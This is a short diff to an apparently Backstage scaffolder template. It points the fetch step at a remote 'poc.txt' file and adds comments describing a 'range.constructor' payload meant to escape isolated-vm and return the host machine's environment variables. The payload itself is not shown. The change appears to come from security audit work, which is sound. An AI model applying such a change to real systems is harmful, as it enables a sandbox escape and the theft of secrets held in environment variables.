@@ -13,7 +13,7 @@ spec:
     - id: fetch
       action: fetch:template
       input:
-        url: ./skeleton
+        url: https://github.com/ceeditnetwork/backstage-audit/blob/main/skeleton/poc.txt
         values:
           # This is the 'range.constructor' payload to break out of isolated-vm
           # It tries to return the environment variables of your Windows machine.
